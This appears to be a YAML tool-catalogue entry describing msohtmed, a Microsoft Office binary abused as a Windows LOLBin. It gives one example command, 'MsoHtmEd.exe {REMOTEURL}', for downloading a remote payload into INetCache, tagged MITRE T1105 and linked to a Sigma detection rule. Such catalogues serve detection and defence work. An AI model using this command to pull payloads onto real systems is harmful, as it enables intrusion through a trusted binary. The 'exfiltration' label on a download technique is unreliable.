---
id: windows-download-msohtmed
namespace: windows:download:msohtmed
name: msohtmed
description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe.'
author: Nir Chako
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- msohtmed
parameters: []
features: []
execution:
  template: msohtmed
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
  command: MsoHtmEd.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml
- type: ioc
  description: Suspicious Office application internet/network traffic
install:
- method: choco
  package_name: msohtmed
  commands:
  - choco install msohtmed
---


# msohtmed

msohtmed is a Windows LOLBin. Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe.
